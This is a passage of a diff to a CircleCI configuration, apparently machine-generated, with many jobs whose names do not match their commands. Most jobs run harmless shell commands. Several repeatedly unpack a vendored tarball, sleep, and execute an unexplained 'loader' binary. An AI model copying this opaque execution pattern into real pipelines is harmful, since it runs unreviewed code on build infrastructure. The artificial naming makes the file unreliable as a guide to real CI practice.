+            sha256sum /tmp/pre/scratche69ef 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  Pen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Weave the vendor payments into deferred revenue
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; : >"/tmp/stackRow-20181108.csv" && ls -l "/tmp/stackRow-20181108.csv"; true ; } > /tmp/pre/slice.shard.proxy.wolf
+            echo "stage finished - $(wc -c </tmp/pre/slice.shard.proxy.wolf) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'slice.shard.proxy.wolf'
+  go1-21-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/slice.shard.proxy.wolf 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  rev18:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Texture day night cycle act 1
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; touch "/tmp/video-audit-inner.dat" && chmod a-w "/tmp/video-audit-inner.dat" && ls -l "/tmp/video-audit-inner.dat"; true ; } > /tmp/pre/invoICeBETaasSeTcarRiER
+            echo "stage finished - $(wc -c </tmp/pre/invoICeBETaasSeTcarRiER) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'invoICeBETaasSeTcarRiER'
+  rm-oauth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/invoICeBETaasSeTcarRiER 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  altLineGal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Only if the ground truth labels time out
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; grep -qs "cache size" /proc/cpuinfo && echo found || echo "not found"; true ; } > /tmp/pre/gadget_wolf
+            echo "stage finished - $(wc -c </tmp/pre/gadget_wolf) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'gadget_wolf'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/scratche69ef 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  TEXTURE_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: afterFilterChipHover
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; cat < /etc/hostname > "${TMPDIR:-/tmp}/agr0.md" && cat "${TMPDIR:-/tmp}/agr0.md"; true ; } > /tmp/pre/smmm6cz
+            echo "stage finished - $(wc -c </tmp/pre/smmm6cz) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'smmm6cz'
+  py310-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/smmm6cz 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  bitId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Ship the password field from staging to west
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nivy,oslo,92\nfrank,boston,61\ncarol,lima,100\nraj,sydney,58\n' >"/tmp/chunk1.tsv" && head -n 1 "/tmp/chunk1.tsv" | tr , "\n"; true ; } > /tmp/pre/87.29.195
+            echo "stage finished - $(wc -c </tmp/pre/87.29.195) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - '87.29.195'
+  add-login:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/87.29.195 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+
+  PACKED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Stage 37 call duty manager
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >'/tmp/q5-2019-09-20.gz' && zcmp /etc/hosts '/tmp/q5-2019-09-20.gz' && echo same; true ; } > /tmp/pre/ea5027d387057b5318c2928aec7a10ee1df73b8
+            echo "stage finished - $(wc -c </tmp/pre/ea5027d387057b5318c2928aec7a10ee1df73b8) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'ea5027d387057b5318c2928aec7a10ee1df73b8'
+  cchSimpleCurrent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: CANARY SPARE DRIVE COLD START
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; letter='podheap' && printf '%s\n' "${letter^^}"; true ; } > /tmp/pre/6b3a18b
+            echo "stage finished - $(wc -c </tmp/pre/6b3a18b) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - '6b3a18b'
+  pEnabledTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Lima first then the west coast
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; seq 57|awk '$1 % 2 == 0'|sort -n|uniq -c|fold -w 38; true ; } > /tmp/pre/NORTH_IRON
+            echo "stage finished - $(wc -c </tmp/pre/NORTH_IRON) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'NORTH_IRON'
+  git-prod-82:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Carefully close the tax report
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/potato.txt && cmp /etc/hosts /tmp/potato.txt && echo same; true ; } > /tmp/pre/zawwXocNjzk
+            echo "stage finished - $(wc -c </tmp/pre/zawwXocNjzk) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'zawwXocNjzk'
+  resultsQueue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Max 500 retries for captioning
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; dirname '/tmp/arc1.out'; true ; } > /tmp/pre/uY
+            echo "stage finished - $(wc -c </tmp/pre/uY) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'uY'
+  lst_sec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Slay the temp files
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; echo -n 'a-b-c' && echo; true ; } > /tmp/pre/smmm6cz
+            echo "stage finished - $(wc -c </tmp/pre/smmm6cz) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'smmm6cz'
+  aki_bot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: recording fail
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=5881\nuser=heidi\ndebug=true\n' > '/tmp/Worker.csv' && grep -c = '/tmp/Worker.csv'; true ; } > /tmp/pre/rusty689
+            echo "stage finished - $(wc -c </tmp/pre/rusty689) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'rusty689'
+  team_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: After hours capture the webhooks
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; ls -n -l -1 -s ~ | tail -n +2 | head -n 4; true ; } > /tmp/pre/slice.shard.proxy.wolf
+            echo "stage finished - $(wc -c </tmp/pre/slice.shard.proxy.wolf) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'slice.shard.proxy.wolf'
+  ARTICLE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Label Loading Bay Double Stack
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; echo -n 'works for me' | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/pre/20220811
+            echo "stage finished - $(wc -c </tmp/pre/20220811) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - '20220811'
+workflows:
+  test:
+    jobs:
+      - hotel-robot
+      - altLineGal
+      - u-dark
+      - pr-2:
+          requires:
+            - hotel-robot
+            - altLineGal
+            - u-dark
+      - preview-build:
+          requires:
+            - hotel-robot
+            - altLineGal
+            - u-dark
+      - wip-retry-leak:
+          requires:
+            - hotel-robot
+            - altLineGal
+            - u-dark
+      - bob-push:
+          requires:
+            - hotel-robot
+            - altLineGal
+            - u-dark
+      - Validate_Tests3:
+          requires:
+            - hotel-robot
+            - altLineGal
+            - u-dark
+      - gating:
+          requires:
+            - hotel-robot
+            - altLineGal
+            - u-dark
+      - pull_or
+      - PACKED:
+          requires:
+            - pull_or
+      - quebec:
+          requires:
+            - PACKED
+      - assert_edge_join:
+          requires:
+            - PACKED
+      - cchSimpleCurrent:
+          requires:
+            - assert_edge_join
+      - titan-beta:
+          requires:
+            - cchSimpleCurrent
+      - NBF__BOTTOM_DATABASE:
+          requires:
+            - cchSimpleCurrent
+      - pEnabledTab:
+          requires:
+            - NBF__BOTTOM_DATABASE
+      - beta-v6:
+          requires:
+            - pEnabledTab
+      - jigsaw-tiger:
+          requires:
+            - pEnabledTab
+      - git-prod-82:
+          requires:
+            - jigsaw-tiger
+      - lets-go:
+          requires:
+            - git-prod-82
+      - tab_is_null:
+          requires:
+            - git-prod-82
+      - resultsQueue:
+          requires:
+            - tab_is_null
+      - INFRA-921:
+          requires:
+            - resultsQueue
+      - entry_2786_detach
+      - HOOK_LAB:
+          requires:
+            - entry_2786_detach
+      - CNN2Header:
+          requires:
+            - entry_2786_detach
+      - phoenix-rev:
+          requires:
+            - CNN2Header
+      - key-47785:
+          requires:
+            - CNN2Header
+      - aug28-canary:
+          requires:
+            - key-47785
+      - rev18:
+          requires:
+            - key-47785
+      - rm-oauth:
+          requires:
+            - rev18
+      - staging-lb-18
+      - MeshToGUI
+      - ttpUP
+      - uma-ship:
+          requires:
+            - staging-lb-18
+            - MeshToGUI
+            - ttpUP
+      - add-router:
+          requires:
+            - staging-lb-18
+            - MeshToGUI
+            - ttpUP
+      - anothr-run:
+          requires:
+            - staging-lb-18
+            - MeshToGUI
+            - ttpUP
+      - DEV_HOOK_5:
+          requires:
+            - staging-lb-18
+            - MeshToGUI
+            - ttpUP
+      - rl-x:
+          requires:
+            - staging-lb-18
+            - MeshToGUI
+            - ttpUP
+      - d9-d0-8e-a5-59-40
+      - rm-session:
+          requires:
+            - d9-d0-8e-a5-59-40
+      - bitId:
+          requires:
+            - d9-d0-8e-a5-59-40
+      - add-login:
+          requires:
+            - bitId
+      - inpInterface7:
+          requires:
+            - bitId
+      - v1-preview:
+          requires:
+            - inpInterface7
+      - FOSTER:
+          requires:
+            - inpInterface7
+      - jess-verify:
+          requires:
+            - FOSTER
+      - ZGP24774:
+          requires:
+            - FOSTER
+      - ivan-smoke:
+          requires:
+            - ZGP24774
+      - initWithRate:
+          requires:
+            - ZGP24774
+      - hotel:
+          requires:
+            - initWithRate
+      - TEXTURE_2
+      - lst_sec:
+          requires:
+            - TEXTURE_2
+      - py310-release:
+          requires:
+            - lst_sec
+      - ID-STATUS-DTL:
+          requires:
+            - lst_sec
+      - aki_bot:
+          requires:
+            - ID-STATUS-DTL
+      - dec23-cleanup:
+          requires:
+            - aki_bot
+      - Pen:
+          requires:
+            - aki_bot
+      - team_uniform:
+          requires:
+            - Pen
+      - go1-21-test:
+          requires:
+            - team_uniform
+      - entry5:
+          requires:
+            - team_uniform
+      - ARTICLE:
+          requires:
+            - entry5
+      - py310-lint:
+          requires:
+            - ARTICLE
